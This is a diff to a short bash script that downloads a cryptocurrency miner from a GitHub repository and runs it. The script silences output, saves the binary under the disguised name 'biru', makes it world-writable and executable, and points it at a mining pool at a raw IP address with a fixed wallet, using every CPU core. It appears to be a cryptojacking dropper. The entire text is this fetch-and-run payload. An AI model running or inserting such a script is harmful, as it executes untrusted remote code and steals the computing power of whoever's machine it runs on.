@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O biru https://github.com/kazppkido/gbut/raw/refs/heads/main/tnn-miner-0.4.2-r3_cpu > /dev/null 2>&1
+wget -O biru https://github.com/kazppkido/gbut/raw/main/SRBMiner-MULTI > /dev/null 2>&1
 chmod 777 biru
-./biru --daemon addres 209.97.168.28:443 --threads $(nproc --all) --wallet xel:kprzhxdp594m5zczayy9d8cxg3kqu978mwqf9hh8qgume3njc97szqqyv646zwcgpkjnr
+./biru --algorithm xelishashv2 --pool 209.97.168.28:443 --wallet xel:kprzhxdp594m5zczayy9d8cxg3kqu978mwqf9hh8qgume3njc97szqqyv646zwcgpkjnr
